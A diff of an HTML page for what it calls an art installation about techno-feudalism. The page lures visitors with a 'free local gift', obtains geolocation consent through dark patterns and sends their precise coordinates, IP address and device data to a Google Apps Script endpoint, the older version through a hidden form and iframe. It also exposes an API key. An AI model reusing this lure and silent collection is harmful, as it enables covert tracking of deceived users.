@@ -1,168 +1,380 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free Wellness GIFt</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Arial Rounded MT Bold', sans-serif;
-      background-color: #b3d9f2;
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .container {
-      max-width: 500px;
-      padding: 20px;
-    }
-    .hidden { display: none; }
-    .terms-link { font-size: 0.8rem; color: #999; text-decoration: none; margin-top: 20px; display: inline-block; }
-    .terms { display: none; margin-top: 10px; font-size: 0.7rem; color: #666; text-align: left; }
-    button { padding: 10px 20px; margin: 10px; cursor: pointer; border: none; border-radius: 4px; background: #77c3d2; color: white; font-weight: bold; }
-    button:hover { background: #5bb2c0; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Local Gift!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #e74c3c;
+        }
+        button {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background-color: #c0392b;
+        }
+        #terms-link {
+            color: #7f8c8d;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+            display: inline-block;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-height: 60vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close:hover {
+            color: black;
+        }
+        #loading {
+            display: none;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #e74c3c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #gif-container {
+            margin-top: 20px;
+        }
+        #error-message {
+            color: #e74c3c;
+            font-weight: bold;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div id="cookieConsent">
-      <h2>This site uses cookies</h2>
-      <p>We use cookies to personalise your free experience. Do you accept?</p>
-      <button onclick="acceptCookies()">Accept</button>
-      <button onclick="denyCookies()">Decline</button>
+    <div class="container" id="welcome-screen">
+        <h1>Free Local Gift!</h1>
+        <p>Welcome! You've been selected to receive a special gift personalized for your location.</p>
+        <p>To continue, please accept our cookies and terms of service.</p>
+        <button id="accept-cookies">Accept</button>
+        <button id="decline-cookies">Decline</button>
+        <br>
+        <span id="terms-link">View Terms</span>
     </div>
 
-    <div id="locationRequest" class="hidden">
-      <h2>Almost there...</h2>
-      <p>Please allow location access so we can tailor your <strong>GIFt</strong> to your city.</p>
-      <button onclick="requestLocation()">Allow Location</button>
-      <button onclick="denyLocation()">Decline</button>
+    <div class="container" id="location-screen" style="display: none;">
+        <h1>Almost there!</h1>
+        <p>To receive your personalized gift, we need to know your location.</p>
+        <button id="share-location">Share Location</button>
+        <button id="decline-location">No Thanks</button>
     </div>
 
-    <div id="giftPage" class="hidden">
-      <h1 id="gifTitle">Loading your local <strong>GIFt</strong>...</h1>
-      <p id="locationStatus">Fetching city-specific delight...</p>
-      <div id="gif-container"></div>
-      <a href="#" class="terms-link" onclick="document.getElementById('terms').style.display = 'block'; return false;">terms & conditions</a>
-      <div id="terms" class="terms">
-        <p>By accessing this digital interface and consenting to location and cookie access, you explicitly grant LOVE SUCKER LOUNGE CORP the irrevocable and unrestricted right to collect, store, reproduce, analyse, redistribute, and monetise your biometric, geographic, and behavioural metadata in perpetuity across all known and future mediums, technologies, or artificial intelligence architectures.</p>
-        <p>You also waive any right to revoke this agreement, deny consent retroactively, or challenge the use of such data in any domestic or international legal jurisdiction. LOVE SUCKER LOUNGE CORP reserves the right to modify, sell, or fictionalise your data as needed for internal optimisation, user simulation, or profit-based narrative construction.</p>
-        <p>Continued interaction constitutes full legal agreement to the above. By accepting your <strong>GIFt</strong>, you surrender ownership of your digital autonomy. Thank you and enjoy the experience.</p>
-      </div>
+    <div class="container" id="loading" style="display: none;">
+        <h1>Preparing your GIFt...</h1>
+        <p>Loading for localised GIFt</p>
+        <div class="loader"></div>
     </div>
 
-    <div id="deniedPage" class="hidden">
-      <h2>Oops!</h2>
-      <p>You must accept both cookies and location access to proceed.</p>
-      <button onclick="location.reload()">Go Back and Try Again</button>
+    <div class="container" id="gift-screen" style="display: none;">
+        <h1>Here's Your GIFt!</h1>
+        <p>Enjoy this special moment from near you:</p>
+        <div id="gif-container"></div>
+        <p>Thank you for participating in our "techno-feudalism" awareness project.</p>
+        <p>Your data has been recorded as part of this art installation.</p>
+        <p id="data-value">Your data's estimated black market value: $<span id="market-value">0000</span></p>
     </div>
-  </div>
 
-  <form id="dataForm" method="POST" target="hiddenIframe" action="https://script.google.com/macros/s/AKfycbvYffRQeJfmPGLD4H0h9jqa3jbcCvi4oY8KXd822MK-tCO_Qs1X4QdeO9YvaxqCHI_r6w/exec">
-    <input type="hidden" name="lat" id="formLat">
-    <input type="hidden" name="lng" id="formLng">
-    <input type="hidden" name="ip" id="formIP">
-    <input type="hidden" name="ua" id="formUA">
-    <input type="hidden" name="map" id="formMap">
-    <input type="hidden" name="value" id="formVal">
-  </form>
-  <iframe name="hiddenIframe" style="display:none;"></iframe>
+    <div id="error-message">ERROR: Please go back and accept to continue.</div>
 
-  <script>
-    let cookiesAccepted = false;
-    let ipAddress = '';
-    const giphyApiKey = 'lSKtiwxXagD1vFtoaQhUnM3Ek6JO8FrX';
+    <div id="terms-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Terms and Conditions</h2>
+            <p>Last updated: April 27, 2025</p>
+            <p>By accessing this website, you agree to be bound by these Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws.</p>
+            <h3>1. Collection of Information</h3>
+            <p>By accepting our Terms and Conditions, you hereby grant us permission to collect, process, store, and potentially share the following information:</p>
+            <ul>
+                <li>Your IP address and associated network data</li>
+                <li>Your precise geographic location (latitude and longitude)</li>
+                <li>Information about your device, including but not limited to: browser type, operating system, screen resolution, language preferences</li>
+                <li>Timestamps of your interactions with this service</li>
+                <li>Any other metadata generated during your interaction with this service</li>
+            </ul>
+            <h3>2. Use of Information</h3>
+            <p>We reserve the right to use the collected information for any purpose we deem appropriate, including but not limited to:</p>
+            <ul>
+                <li>Academic research and educational purposes</li>
+                <li>Public demonstrations and exhibits</li>
+                <li>Development of user profiles and behavioral analysis</li>
+                <li>Sharing with third parties for research, analysis, or commercial purposes</li>
+                <li>Publication in academic journals, websites, or other media</li>
+            </ul>
+            <h3>3. Art Installation Disclosure</h3>
+            <p>This service is part of an art installation exploring issues of privacy, data rights, and techno-feudalism. By accepting these terms, you become a participant in this installation.</p>
+            <h3>4. Data Storage and Retention</h3>
+            <p>All collected data may be stored indefinitely and in any manner we deem appropriate. We make no guarantees regarding the security of this data.</p>
+            <h3>5. Disclaimer of Warranties</h3>
+            <p>This service is provided on an "as is" basis with no warranties of any kind, either express or implied.</p>
+            <h3>6. Limitation of Liability</h3>
+            <p>Under no circumstances shall we be liable for any direct, indirect, incidental, special, or consequential damages arising out of or in any way connected with the use of this service.</p>
+            <h3>7. Governing Law</h3>
+            <p>These Terms shall be governed by and construed in accordance with the laws of the jurisdiction in which the art installation is presented, without regard to its conflict of law provisions.</p>
+            <h3>8. Changes to Terms</h3>
+            <p>We reserve the right to modify these terms at any time without notice.</p>
+            <h3>9. Consent</h3>
+            <p>By clicking "Accept" you acknowledge that you have read, understood, and agree to be bound by these Terms and Conditions.</p>
+        </div>
+    </div>
 
-    const cityLandmarks = {
-      sydney: "sydney opera house",
-      melbourne: "flinders street station",
-      brisbane: "story bridge",
-      london: "big ben",
-      paris: "eiffel tower",
-      newyork: "statue of liberty",
-      tokyo: "tokyo tower"
-    };
+    <script>
+        // Global variables
+        let userLatitude = null;
+        let userLongitude = null;
+        let userIP = "";
+        let userDevice = "";
+        const GIPHY_API_KEY = "lSKtiwxXagD1vFtoaQhUnM3Ek6JO8FrX";
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbvYffRQeJfmPGLD4H0h9jqa3jbcCvi4oY8KXd822MK-tCO_Qs1X4QdeO9YvaxqCHI_r6w/exec";
 
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        ipAddress = data.ip;
-      });
+        // Get user device info
+        userDevice = navigator.userAgent;
 
-    function acceptCookies() {
-      cookiesAccepted = true;
-      document.getElementById('cookieConsent').classList.add('hidden');
-      document.getElementById('locationRequest').classList.remove('hidden');
-    }
+        // Get user IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+            })
+            .catch(error => {
+                console.error('Error getting IP:', error);
+                userIP = "Unknown";
+            });
 
-    function denyCookies() {
-      showDenied();
-    }
+        // Button and screen handlers
+        document.getElementById('accept-cookies').addEventListener('click', function() {
+            document.getElementById('welcome-screen').style.display = 'none';
+            document.getElementById('location-screen').style.display = 'block';
+        });
 
-    function denyLocation() {
-      showDenied();
-    }
+        document.getElementById('decline-cookies').addEventListener('click', function() {
+            showError();
+        });
 
-    function showDenied() {
-      document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
-      document.getElementById('deniedPage').classList.remove('hidden');
-    }
+        document.getElementById('share-location').addEventListener('click', function() {
+            document.getElementById('location-screen').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(handleLocationSuccess, handleLocationError);
+            } else {
+                showError();
+            }
+        });
 
-    function requestLocation() {
-      if (!cookiesAccepted) {
-        showDenied();
-        return;
-      }
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
-            document.getElementById('giftPage').classList.remove('hidden');
+        document.getElementById('decline-location').addEventListener('click', function() {
+            showError();
+        });
 
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-            const randValue = (Math.floor(Math.random() * 9000) + 1000).toString();
+        // Terms modal
+        const modal = document.getElementById('terms-modal');
+        const termsLink = document.getElementById('terms-link');
+        const closeBtn = document.getElementsByClassName('close')[0];
 
-            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
-              .then(res => res.json())
-              .then(data => {
-                const cityRaw = data.address.city || data.address.town || data.address.village || 'your area';
-                const cityKey = cityRaw.toLowerCase().replace(/\s+/g, '');
-                const landmark = cityLandmarks[cityKey] || cityRaw;
+        termsLink.addEventListener('click', function() {
+            modal.style.display = 'block';
+        });
 
-                fetch(`https://api.giphy.com/v1/gifs/search?api_key=${giphyApiKey}&q=${encodeURIComponent(landmark)}&limit=1&rating=g`)
-                  .then(response => response.json())
-                  .then(gifData => {
-                    const gifUrl = gifData.data[0]?.images.original.url || 'https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif';
-                    document.getElementById('gif-container').innerHTML = `<img src="${gifUrl}" alt="gift" width="100%">`;
-                    document.getElementById('locationStatus').innerHTML = `Here’s a <strong>GIFt</strong> chosen for ${cityRaw}`;
-                    document.getElementById('gifTitle').innerHTML = `Your local <strong>GIFt</strong> has arrived`;
+        closeBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
+        });
 
-                    document.getElementById('formLat').value = lat;
-                    document.getElementById('formLng').value = lng;
-                    document.getElementById('formIP').value = ipAddress;
-                    document.getElementById('formUA').value = navigator.userAgent;
-                    document.getElementById('formMap').value = mapLink;
-                    document.getElementById('formVal').value = randValue;
+        window.addEventListener('click', function(event) {
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
 
-                    document.getElementById('dataForm').submit();
-                  });
-              });
-          },
-          function(error) {
-            showDenied();
-          }
-        );
-      } else {
-        showDenied();
-      }
-    }
-  </script>
+        // Handle location success
+        function handleLocationSuccess(position) {
+            userLatitude = position.coords.latitude;
+            userLongitude = position.coords.longitude;
+            
+            // Generate random "market value" between $1000-$9999
+            const marketValue = Math.floor(Math.random() * 9000) + 1000;
+            document.getElementById('market-value').textContent = marketValue;
+            
+            // Search for GIF based on location
+            searchLocationGif(userLatitude, userLongitude);
+            
+            // Send data to Google Sheet
+            sendDataToSheet(userLatitude, userLongitude, marketValue);
+        }
+
+        // Handle location error
+        function handleLocationError() {
+            showError();
+        }
+
+        // Show error message
+        function showError() {
+            document.getElementById('welcome-screen').style.display = 'none';
+            document.getElementById('location-screen').style.display = 'none';
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('gift-screen').style.display = 'none';
+            document.getElementById('error-message').style.display = 'block';
+            
+            // Return to welcome screen after 3 seconds
+            setTimeout(function() {
+                document.getElementById('error-message').style.display = 'none';
+                document.getElementById('welcome-screen').style.display = 'block';
+            }, 3000);
+        }
+
+        // Search for location-related GIF
+        function searchLocationGif(latitude, longitude) {
+            // Reverse geocode to get location name
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=10`)
+                .then(response => response.json())
+                .then(data => {
+                    let locationName = "Unknown location";
+                    
+                    // Try to get a landmark or location name
+                    if (data.address) {
+                        if (data.address.city) {
+                            locationName = data.address.city;
+                        } else if (data.address.town) {
+                            locationName = data.address.town;
+                        } else if (data.address.suburb) {
+                            locationName = data.address.suburb;
+                        }
+                    }
+                    
+                    // Search Giphy for related GIF
+                    return fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=${encodeURIComponent(locationName)}&limit=5&rating=g`);
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.data && data.data.length > 0) {
+                        // Get a random GIF from the results
+                        const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 5));
+                        const gifUrl = data.data[randomIndex].images.fixed_height.url;
+                        displayGif(gifUrl);
+                    } else {
+                        // Fall back to a generic "location" GIF
+                        return fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=location&limit=5&rating=g`);
+                    }
+                })
+                .then(response => {
+                    if (response) return response.json();
+                })
+                .then(data => {
+                    if (data && data.data && data.data.length > 0) {
+                        const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 5));
+                        const gifUrl = data.data[randomIndex].images.fixed_height.url;
+                        displayGif(gifUrl);
+                    } else {
+                        // If all else fails, show an error
+                        showError();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error getting GIF:', error);
+                    showError();
+                });
+        }
+
+        // Display GIF
+        function displayGif(gifUrl) {
+            const gifContainer = document.getElementById('gif-container');
+            const img = document.createElement('img');
+            img.src = gifUrl;
+            img.alt = "Your Local GIFt";
+            gifContainer.innerHTML = '';
+            gifContainer.appendChild(img);
+            
+            // Hide loading, show gift
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('gift-screen').style.display = 'block';
+        }
+
+        // Send data to Google Sheet
+        function sendDataToSheet(latitude, longitude, marketValue) {
+            const timestamp = new Date().toISOString();
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const data = {
+                timestamp: timestamp,
+                ip: userIP,
+                latitude: latitude,
+                longitude: longitude,
+                deviceInfo: userDevice,
+                mapLink: mapLink,
+                marketValue: marketValue
+            };
+            
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                cache: 'no-cache',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
 </body>
 </html>
